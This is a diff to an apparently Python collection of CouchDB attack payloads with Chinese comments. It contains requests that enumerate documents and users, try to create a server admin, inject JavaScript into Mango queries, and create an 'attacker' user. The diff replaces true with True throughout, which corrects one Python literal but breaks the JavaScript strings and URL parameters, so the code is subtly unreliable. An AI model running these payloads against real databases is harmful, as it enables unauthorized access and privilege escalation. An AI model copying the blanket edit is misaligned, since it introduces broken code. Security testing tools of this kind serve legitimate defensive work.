@@ -93,7 +93,7 @@ VIEW_QUERY_PAYLOADS = [
     "GET /{db_name}/_design/{design_doc}/_view/{view_name}?key=\"{key}\"",
     "GET /{db_name}/_design/{design_doc}/_view/{view_name}?startkey=\"{startkey}\"&endkey=\"{endkey}\"",
     "GET /{db_name}/_design/{design_doc}/_view/{view_name}?limit={limit}&skip={skip}",
-    "GET /{db_name}/_design/{design_doc}/_view/{view_name}?group=true",
+    "GET /{db_name}/_design/{design_doc}/_view/{view_name}?group=True",
     
     # 临时视图
     "POST /{db_name}/_temp_view",
@@ -141,9 +141,9 @@ INJECTION_ATTACK_PAYLOADS = [
     "PUT /_node/_local/_config/admins/admin",  # 尝试创建服务器管理员
     
     # 文档枚举
-    "GET /{db_name}/_all_docs?include_docs=true",
-    "GET /{db_name}/_design_docs?include_docs=true",
-    "GET /{db_name}/_changes?include_docs=true",
+    "GET /{db_name}/_all_docs?include_docs=True",
+    "GET /{db_name}/_design_docs?include_docs=True",
+    "GET /{db_name}/_changes?include_docs=True",
     
     # 视图注入
     {
@@ -173,7 +173,7 @@ JSON_PARAMETER_INJECTION_PAYLOADS = [
         "path": "/_find",
         "payload": {
             "selector": {
-                "$where": "function() { sleep(5000); return true; }"
+                "$where": "function() { sleep(5000); return True; }"
             }
         },
         "description": "在Mango查询中尝试注入JavaScript"
@@ -194,7 +194,7 @@ JSON_PARAMETER_INJECTION_PAYLOADS = [
         "payload": {
             "selector": {
                 "password": {
-                    "$exists": true
+                    "$exists": True
                 }
             }
         },
@@ -221,7 +221,7 @@ JSON_PARAMETER_INJECTION_PAYLOADS = [
                 }
             },
             "filters": {
-                "important": "function(doc, req) { return true; }"
+                "important": "function(doc, req) { return True; }"
             },
             "updates": {
                 "updateField": "function(doc, req) { doc.updated_by = 'attacker'; return [doc, 'Updated!'] }"
@@ -250,7 +250,7 @@ ATTACK_SEQUENCES = [
     {
         "name": "用户枚举与提升权限",
         "steps": [
-            {"method": "GET", "path": "/_users/_all_docs?include_docs=true", "description": "获取所有用户信息"},
+            {"method": "GET", "path": "/_users/_all_docs?include_docs=True", "description": "获取所有用户信息"},
             {"method": "GET", "path": "/_users/org.couchdb.user:admin", "description": "尝试获取admin用户信息"},
             {"method": "PUT", "path": "/_users/org.couchdb.user:attacker", "body": {
                 "name": "attacker",
@@ -267,7 +267,7 @@ ATTACK_SEQUENCES = [
         "steps": [
             {"method": "GET", "path": "/_all_dbs", "description": "获取所有数据库"},
             {"method": "GET", "path": "/users", "description": "访问用户数据库"},
-            {"method": "GET", "path": "/users/_all_docs?include_docs=true", "description": "获取所有用户文档"},
+            {"method": "GET", "path": "/users/_all_docs?include_docs=True", "description": "获取所有用户文档"},
             {"method": "GET", "path": "/config", "description": "尝试访问配置数据库"},
             {"method": "GET", "path": "/logs", "description": "尝试访问日志数据库"}
         ]
